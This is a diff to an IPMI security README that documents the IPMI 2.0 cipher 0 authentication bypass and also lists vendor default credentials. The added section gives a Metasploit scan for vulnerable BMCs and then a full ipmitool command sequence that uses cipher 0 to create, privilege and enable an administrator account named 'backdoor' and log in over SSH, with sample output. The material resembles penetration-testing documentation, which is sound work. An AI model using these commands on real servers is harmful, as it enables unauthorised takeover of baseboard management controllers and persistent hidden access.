@@ -1,5 +1,7 @@
-# awesome-ipmi
+# Awesome-IPMI
 The one that just not exploit IPMI protocol.
+Well this is a documentation of the IPMI based vulnerabilities, exploits and other relevant information regarding this protocol. 
+SARCASM, TROLLING and JOKES are ADVISED.
 
 # What the hack is IPMI?
 
@@ -51,7 +53,75 @@ Hell no!
 | Supermicro IPMI (2.0)                           | ADMIN            | ADMIN                                   |
 
 ## IPMI Authentication Bypass via Cipher 0
-tbc
+Dan Farmer identified a serious failing of the IPMI 2.0 specification, namely that cipher type 0, an indicator that the client wants to use clear-text authentication, actually allows access with any password. Cipher 0 issues were identified in HP, Dell, and Supermicro BMCs, with the issue likely encompassing all IPMI 2.0 implementations. It is easy to identify systems that have cipher 0 enabled using the ipmi_cipher_zero module in the Metasploit Framework
+
+#### Identification using Metasploit
+```$ msfconsole
+ 
+`      =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
++ -- --=[ 1119 exploits - 638 auxiliary - 179 post
++ -- --=[ 309 payloads - 30 encoders - 8 nops
+ 
+msf> use auxiliary/scanner/ipmi/ipmi_cipher_zero
+msf auxiliary(ipmi_cipher_zero) > set RHOSTS 10.0.0.0/24
+msf auxiliary(ipmi_cipher_zero) > run
+[*] Sending IPMI requests to 10.0.0.0->10.0.0.255 (256 hosts)
+[+] 10.0.0.99:623 VULNERABLE: Accepted a session open request for cipher zero
+[+] 10.0.0.132:623 VULNERABLE: Accepted a session open request for cipher zero
+[+] 10.0.0.141:623 VULNERABLE: Accepted a session open request for cipher zero
+[+] 10.0.0.153:623 VULNERABLE: Accepted a session open request for cipher zero
+```
+
+#### Exploiting using IPMITOOL
+First of let's install the tool (sudo apt-get install ipmitool) and after let's use it to bypass authentification.
+```
+$ ipmitool -I lanplus -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
+```
+Error: Unable to establish IPMI v2 / RMCP+ session
+Get User Access command failed (channel 14, user 1)
+`` 
+$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
+```
+ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
+1  Administrator    true    false      true      ADMINISTRATOR
+2  (Empty User)    true    false      false      NO ACCESS
+`` 
+$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set name 2 backdoor
+```
+```
+$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set password 2 password
+```
+```
+$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user priv 2 4
+```
+```
+$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user enable 2
+```
+```
+$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
+```
+ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
+
+1  Administrator    true    false      true      ADMINISTRATOR
+
+2  backdoor              true    false      true      ADMINISTRATOR
+
+``` 
+$ ssh backdoor@10.0.0.99
+```
+
+backdoor@10.0.0.99's password: password
+
+User:backdoor logged-in to ILOMXQ3469216(10.0.0.99)
+
+iLO 4 Advanced Evaluation 1.13 at  Nov 08 2012
+
+Server Name: host is unnamed
+
+Server Power: On
+ 
+</>hpiLO->
+
 ## IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval  (A: are you that serious?)
 tbc
 ## IPMI Anonymous Authentication (B: yes)
@@ -66,3 +136,8 @@ tbc
 
 # But what is the big deal?
 Just wait for it ... to be continued.
+
+
+# Sources
+* https://community.rapid7.com/community/metasploit/blog/2013/07/02/a-penetration-testers-guide-to-ipmi
+
